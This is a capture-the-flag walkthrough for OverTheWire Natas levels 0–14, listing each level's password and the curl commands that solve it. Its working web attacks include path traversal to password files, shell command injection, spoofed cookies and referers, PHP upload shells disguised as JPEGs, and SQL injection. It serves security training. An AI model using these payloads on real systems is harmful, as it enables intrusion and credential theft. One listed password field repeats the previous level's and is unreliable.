# Natas

## Natas0

*	user: `natas0`
*	pass: `natas0`
*	url: `http://natas0.natas.labs.overthewire.org`
*	flag: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

### Procedure

1.	Get the page's source (e.g. `CTRL+U` on FF)

2.	Look the HTML comment at line 16

		<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->

## Natas1

*	user: `natas1`
*	pass: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`
*	url: `http://natas1.natas.labs.overthewire.org`
*	flag: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

### Procedure

1.	Get the page's source (e.g. `CTRL+U` on FF)

2.	Look the HTML comment at line 17

		<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->

## Natas2

*	user: `natas2`
*	pass: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`
*	url: `http://natas2.natas.labs.overthewire.org`
*	flag: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

### Procedure

1.	Get the page's source (e.g. `CTRL+U` on FF)

2.	Statement *There is nothing on this page* is false! What about `<img>` tag?

		<img src="files/pixel.png">

3.	The image seems to be a one pixel image without any relevat info. Let's try
	if the URL `http://natas2.natas.labs.overthewire.or/files` give us
	something...

4.	BINGO! The `/files` path is listable and we can see an interesting file
	named `users.txt`. Let's try to get its conent...

		$ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
		# username:password
		alice:BYNdCesZqW
		bob:jw2ueICLvT
		charlie:G5vCxkVV3m
		natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
		eve:zo4mJWyNj2
		mallory:9urtcpzBmH

## Natas3

*	user: `natas3`
*	pass: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`
*	url: `http://natas3.natas.labs.overthewire.org`
*	flag: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

### Procedure

1.	Get the page's source (e.g. `CTRL+U` on FF)

2.	At line 15, there is an HTML comment with a hint (*Not even Google will
	find it this time...*).

3.	How to disable page indexing? Simple! Use `Disallow` directive in
	`robots.txt` file. Let's try if it's available

		$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
		User-agent: *
		Disallow: /s3cr3t/

4.	Let's try to list `/s3cr3t/` path. Yep! Another `users.txt` file

		$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
		natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

## Natas4

*	user: `natas4`
*	pass: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`
*	url: `http://natas4.natas.labs.overthewire.org`
*	flag: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

### Procedure

1.	By getting the page's source code, we can see that there's nothing
	interesting. By clicking on `Refresh page`, page content changes from

		Access disallowed. You are visiting from "" while [...]

	to

		Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while [...]

	then if newly click on `Refresh page` it changes in

		Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while [...]

	Seems that it's related to `Referer` HTTP header. Indeed, by repeating the
	procedure with a sniffer, we can see that `Referer` header is set.

2.	The page suggests us that *authorized users should come only from [...]*.
	Let's try to set the `Referer` header to desired value
	(`http://natas5.natas.labs.overthewire.org/`)

		$ curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
		<body>
		<h1>natas4</h1>
		<div id="content">

		Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
		<br/>
		<div id="viewsource"><a href="index.php">Refresh page</a></div>
		</div>
		</body>
		</html>

## Natas5

*	user: `natas5`
*	pass: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`
*	url: `http://natas5.natas.labs.overthewire.org`
*	flag: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

### Procedure

1.	When accessing the page, the following message is received

		Access disallowed. You are not logged in

	It's common to use cookies to check if a user is logged in. So let's try
	with a sniffer (e.g. Wireshark) if specific cookie is required.

2.	Bingo! When page is accessed, cookie `loggedin=0` is sent. Let's try to
	change it in 1

		$ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -b loggedin=1 http://natas5.natas.labs.overthewire.org/
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
		<body>
		<h1>natas5</h1>
		<div id="content">
		Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
		</body>
		</html>

	Seems to work...

## Natas6

*	user: `natas6`
*	pass: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`
*	url: `http://natas6.natas.labs.overthewire.org`
*	flag: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

### Procedure

1.	By clicking on `View sourcecode` a PHP script is shown

		<?

		include "includes/secret.inc";

		if(array_key_exists("submit", $_POST)) {
				if($secret == $_POST['secret']) {
				print "Access granted. The password for natas7 is <censored>";
			} else {
				print "Wrong secret";
			}
		}
		?>

2.	The script says that `secret` parameter in the `POST` is checked
	against variable `$secret`. Furthermore, file `includes/secret.inc`
	is imported. Let's see what it contains

		$ curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
		<?
		$secret = "FOEIUWGHFEEUHOFUOIU";
		?>

3.	Go back to the home page and try to provide the secret
	`FOEIUWGHFEEUHOFUOIU`. Bingo!

		Access granted. The password for natas7 is
		7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

## Natas7

*	user: `natas7`
*	pass: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
*	url: `http://natas7.natas.labs.overthewire.org`
*	flag: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

### Procedure

1.	Page provides `Home` and `About` that link to

		http://natas7.natas.labs.overthewire.org/index.php?page=home

	and

		http://natas7.natas.labs.overthewire.org/index.php?page=about

	By taking a look in the source code there is the hint

		<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

2.	Let's try to pass `/etc/natas_webpass/natas8` path as `page` value

		$ curl -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
		<html>
		<head>[...]</head>
		<body>
		<h1>natas7</h1>
		<div id="content">

		<a href="index.php?page=home">Home</a>
		<a href="index.php?page=about">About</a>
		<br>
		<br>
		DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

		<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
		</div>
		</body>
		</html>

## Natas8

*	user: `natas8`
*	pass: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`
*	url: `http://natas8.natas.labs.overthewire.org`
*	flag: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

### Procedure

1.	This seems to be similar to Natas6. Let's click on `View sourcecode`

		<?

		$encodedSecret = "3d3d516343746d4d6d6c315669563362";

		function encodeSecret($secret) {
			return bin2hex(strrev(base64_encode($secret)));
		}

		if(array_key_exists("submit", $_POST)) {
			if(encodeSecret($_POST['secret']) == $encodedSecret) {
			print "Access granted. The password for natas9 is <censored>";
			} else {
			print "Wrong secret";
			}
		}
		?>

2.	Secret `3d3d516343746d4d6d6c315669563362` seems to be a HEX string.
	Decode it

		$ echo -n 3d3d516343746d4d6d6c315669563362 | perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
		==QcCtmMml1ViV3b

	It's a reversed Base64 string. Let's try to decode it

		$ echo "==QcCtmMml1ViV3b" | rev | base64 -d
		oubWYf2kBq

3.	Let's try to use `oubWYf2kBq` secret

		Access granted. The password for natas9 is
		W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

## Natas9

*	user: `natas9`
*	pass: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
*	url: `http://natas9.natas.labs.overthewire.org`
*	flag: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

### Procedure

1.	Let's click on `View sourcecode`

		<pre>
		<?
		$key = "";

		if(array_key_exists("needle", $_REQUEST)) {
			$key = $_REQUEST["needle"];
		}

		if($key != "") {
			passthru("grep -i $key dictionary.txt");
		}
		?>
		</pre>

2.	The way to call `grep` command seems to be vulnerable to commands
	injection. Let's try to set value of `needle` parameter to
	`; ls -l ;`

		total 480
		drwxr-x---  2 natas9 natas9   4096 Nov 14 10:32 .
		drwxr-xr-x 34 root   root     4096 Nov 15 17:17 ..
		-rw-r-----  1 natas9 natas9    118 Nov 14 10:32 .htaccess
		-rw-r-----  1 natas9 natas9     42 Nov 14 10:32 .htpasswd
		-rw-r-----  1 natas9 natas9 460878 Nov 14 10:27 dictionary.txt
		-rw-r-----  1 natas9 natas9   1952 Nov 14 10:32 index-source.html
		-rw-r-----  1 natas9 natas9   1185 Nov 14 10:32 index.php
		-rw-r-----  1 natas9 natas9   1165 Nov 14 10:27 index.php.tmpl

3.	Let's try the same path suggested in Natas7. By injecting the
	following code

		; cat /etc/natas_webpass/natas10 ;

	the result is

		nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

## Natas10

*	user: `natas10`
*	pass: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
*	url: `http://natas10.natas.labs.overthewire.org`
*	flag: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

### Procedure

1.	It seems to be similar to Natas9 but here chars `;`, `&` and `|`
	are not allowed. Let's try with other *magic* symbols...

2.	By inserting `*` seems that something is mooving in the right way.
	Indeed, `grep` supports wildcards, so let's try with `.*`...

3.	Well! Files in current dir are listed, but `dictionary.txt` is huge

		.htaccess:AuthType Basic
		.htaccess: AuthName "Authentication required"
		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
		.htaccess: require valid-user
		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
		dictionary.txt:African
		dictionary.txt:Africans
		dictionary.txt:Allah
		dictionary.txt:Allah's
		dictionary.txt:American
		...

4.	Let's try to exclude it by using `.* #`...

		.htaccess:AuthType Basic
		.htaccess: AuthName "Authentication required"
		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
		.htaccess: require valid-user
		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.

5.	Yep! I feel the smell of the flag! As is Natas7 and Natan9, now
	password should be in

		/etc/natas_webpass/natas11

	Let's try by injecting `.* /etc/natas_webpass/natas11 #`

		.htaccess:AuthType Basic
		.htaccess: AuthName "Authentication required"
		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
		.htaccess: require valid-user
		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
		/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

## Natas11

*	user: `natas11`
*	pass: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
*	url: `http://natas11.natas.labs.overthewire.org`
*	flag: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

### Procedure

1.	The hint *Cookies are protected with XOR encryption* is clear. We have to
	force an XOR-based encryption. From the theory, if `text ^ key = enc` then
	`enc ^ text = key`.

2.	By sniffing, we can get a cookie called `data` with the following content

		ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV56QUcIaAw=

	Furthermore, by taking a look in the source code, there is the XOR-base
	encryption function

		function xor_encrypt($in) {
			$key = '<censored>';
			$text = $in;
			$outText = '';
			// Iterate through each character
			for($i=0;$i<strlen($text);$i++) {
				$outText .= $text[$i] ^ $key[$i % strlen($key)];
			}
			return $outText;
		}

3.	To get our key the simplest way is to define a new function as follow

		function xor_encrypt_2($in) {
			$key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV56QUcIaAw=");
			$text = $in;
			$outText = '';

			// Iterate through each character
			for($i=0;$i<strlen($text);$i++) {
				$outText .= $text[$i] ^ $key[$i % strlen($key)];
			}
			return $outText;
		}

	then use it in your local script

		<?php
			function xor_encrypt_2($in) {
				$key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV56QUcIaAw=");
				$text = $in;
				$outText = '';

				// Iterate through each character
				for($i=0;$i<strlen($text);$i++) {
					$outText .= $text[$i] ^ $key[$i % strlen($key)];
				}
				return $outText;
			}

			$mydata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff" );
			$mydata_json = json_encode($mydata);
			$mydata_enc = xor_encrypt_2($mydata_json);
			echo $mydata_enc;
		?>

	The result should be

		$ php myscript.php
		qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8'!nJq

	It seems to be a repetition of string `qw8J`. It should be the key...

4.	Create a new function like this

		function xor_encrypt_2($in) {
			//$key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV56QUcIaAw=");
			$key = "qw8J";
			$text = $in;
			$outText = '';

			// Iterate through each character
			for($i=0;$i<strlen($text);$i++) {
				$outText .= $text[$i] ^ $key[$i % strlen($key)];
			}
			return $outText;
		}

	and run the following script

		<?php
			function xor_encrypt_2($in) {
				//$key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV56QUcIaAw=");
				$key = "qw8J";
				$text = $in;
				$outText = '';

				// Iterate through each character
				for($i=0;$i<strlen($text);$i++) {
					$outText .= $text[$i] ^ $key[$i % strlen($key)];
				}
				return $outText;
			}

			$mydata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff" );
			$mydata_json = json_encode($mydata);
			$mydata_enc = xor_encrypt_2($mydata_json);
			$mydata_b64 = base64_encode($mydata_enc);
			echo $mydata_b64;
		?>

	is should return

		$ php myscript.php
		ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

5.	Well, let's try to use it as cookie

		$ curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK -b data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK http://natas11.natas.labs.overthewire.org
		<html>

		[cut]

		<h1>natas11</h1>
		<div id="content">
		<body style="background: #ffffff;">
		Cookies are protected with XOR encryption<br/><br/>

		The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>

		[cut]

		</html>

## Natas12

*	user: `natas12`
*	pass: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`
*	url: `http://natas12.natas.labs.overthewire.org`
*	flag: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`

### Procedure

1.	This level allows images, or better, files upload and provides a
	link to them. By taking a look in the source code, it's possible to
	understand how the destination path is generated. In few words,
	uploaded files will be available at

		/upload/<random string>.<extension>

2.	While `<random string>` is random, `<extension>` is determined from
	the form's hidden field `filename`. So, let's try to verify it.
	Create a file called `image.php` and upload it

		$ echo "<?php phpinfo(); ?>" >  image.php
		$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas12</h1>
		<div id="content">
		The file <a href="upload/dlqovjn3kh.php">upload/dlqovjn3kh.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

3.	Well. It seems to work. Let's try if [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
	vulnerability is exploitable. If true, by clicking on

		http://natas12.natas.labs.overthewire.org/upload/dlqovjn3kh.php

	we should see the standard `phpinfo()` page. Of course, it works!

4.	Let's try to access the file `/etc/natas_webpass/natas13`. Modify
	`image.php` with the following content

		<?php
			$p = file_get_contents("/etc/natas_webpass/natas13");
			echo $p;
		?>

	and upload it

		$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas12</h1>
		<div id="content">
		The file <a href="upload/r0qf78xvfq.php">upload/r0qf78xvfq.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

	Now, let's try to execute our script

		$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/upload/r0qf78xvfq.php
		jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

## Natas13

*	user: `natas13`
*	pass: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
*	url: `http://natas13.natas.labs.overthewire.org`
*	flag: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

### Procedure

1.	It seems to be the same approach of Natas12 but now, the file's
	signature is checked with the PHP function `exif_imagetype()`.
	According to documentation indeed, such function

		reads the first bytes of an image and checks its signature.

2.	JPEG signature is `0xFF 0xD8 0xFF 0xE0`, so let's start by forging
	a JPEG file

		$ echo -e "\xFF\xD8\xFF\xE0" > image.php
		$ file image.php
		image.php: JPEG image data

	Now append the PHP code

		$ echo -n '<?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?>' >> image.php
		$ file image.php
		image.php: JPEG image data

3.	Upload the "image" as in Natas12

		$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas13.natas.labs.overthewire.org
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas13</h1>
		<div id="content">
		For security reasons, we now only accept image files!<br/><br/>

		The file <a href="upload/7q86uwt60z.php">upload/7q86uwt60z.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

	and check the content

		$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/upload/7q86uwt60z.php
		����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## Natas14

*	user: `natas14`
*	pass: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`
*	url: `http://natas14.natas.labs.overthewire.org`
*	flag: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

### Procedure

1.	By analysing the source code, catches the eye a non parametrised
	SQL query

		$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

	that means [SQL Injection](http://en.wikipedia.org/wiki/SQL_injection)

2.	Furthermore, it's possible to enable a simple debugging mode by
	providing through a `GET` `username`, `password` and `debug`
	parameters. So let's try...

		$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 "http://natas14.natas.labs.overthewire.org/?debug&username=alice&password=s3cr3t"
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas14</h1>
		<div id="content">
		Executing query: SELECT * from users where username="alice" and password="s3cr3t"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

3.	It seems to work. Let's try something tricky...

		$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 --data "username=1\"%20or%20\"a\"=\"a\"#&password=NotNecessary" "http://natas14.natas.labs.overthewire.org/?debug"
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas14</h1>
		<div id="content">
		Executing query: SELECT * from users where username="1" or "a"="a"#" and password="NotNecessary"<br>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

	Yep! It works! The key is to pass as `username` the following string

		1" or "a"="a"#
